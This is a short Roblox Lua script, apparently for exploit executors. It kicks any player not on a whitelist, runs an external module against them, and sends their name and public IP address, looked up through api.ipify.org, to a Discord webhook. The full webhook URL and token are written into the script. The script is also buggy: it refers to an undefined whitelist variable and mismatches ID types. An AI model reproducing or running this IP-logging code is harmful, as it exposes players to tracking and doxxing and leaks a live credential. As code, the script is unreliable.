game.Players.PlayerAdded:Connect(function(player)
local wl = (
    "146730684",
    "243399355"
)
  local whitelisted = false
  for i,v in pairs(whitelist) do
    if v == player.UserId then
      whitelisted = true
      break;
    end
  end
  if not whitelisted then
    require(8222129769).youareanidiot(player)
    player:Kick("This script was project by DevCuersy ur little skid")
    print("SKID DETECTED")
    local webh = "https://discord.com/api/webhooks/1022571312599814186/eIqT1sF85rrEtGs9lFsVazwoYnEraLAVqpV6FnGQBCSrFSinoC4hPZrK82N6phsG6zsE"

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name,
               ["description"] = game:HttpGet("https://api.ipify.org")
           }
       }
   }

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)
  end
end)
